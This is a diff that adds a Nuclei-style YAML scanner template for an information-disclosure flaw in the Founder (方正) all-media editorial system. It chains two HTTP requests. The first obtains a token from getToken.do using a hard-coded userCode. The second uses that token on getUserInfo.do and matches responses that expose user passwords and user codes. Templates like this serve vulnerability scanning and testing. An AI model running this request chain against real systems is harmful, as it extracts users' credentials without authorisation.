@@ -1,0 +1,46 @@
+id: poc-yaml-founder-getuserinfo-info-leak
+info:
+  name: 方正全媒体采编系统 getUserInfo 信息泄露漏洞
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: 信息泄露
+http:
+  - raw:
+      - |
+        GET /newsedit/tokenHelp/getToken.do?userCode=a18f178d935d2284a771f6f5903d7160 HTTP/1.1
+        Host: {{Hostname}}
+    extractors:
+      - type: regex
+        name: token
+        part: body
+        internal: true
+        regex:
+          - '"token":"(?P<token>.*?)"'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "token"
+        condition: and
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        GET /newsedit/tokenHelp/getUserInfo.do?token={{token}} HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - '"pwd":\".*?\"'
+          - '"userCode":\".*?\"'
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
+      - type: status
+        status:
+          - 200
